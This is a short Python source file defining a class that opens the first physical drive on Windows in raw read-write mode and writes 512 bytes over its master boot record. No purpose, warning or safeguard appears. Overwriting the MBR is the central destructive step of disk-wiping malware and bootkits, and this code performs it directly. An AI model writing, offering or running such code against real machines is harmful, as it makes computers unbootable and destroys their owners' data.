import ctypes

class WindowsMBROverwriter:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32

    def overwrite_mbr(self, mbr_data):
        if len(mbr_data) != 512:
            raise ValueError("MBR data must be 512 bytes")

        with open(r"\\.\PhysicalDrive0", "rb+") as drive:
            drive.write(mbr_data)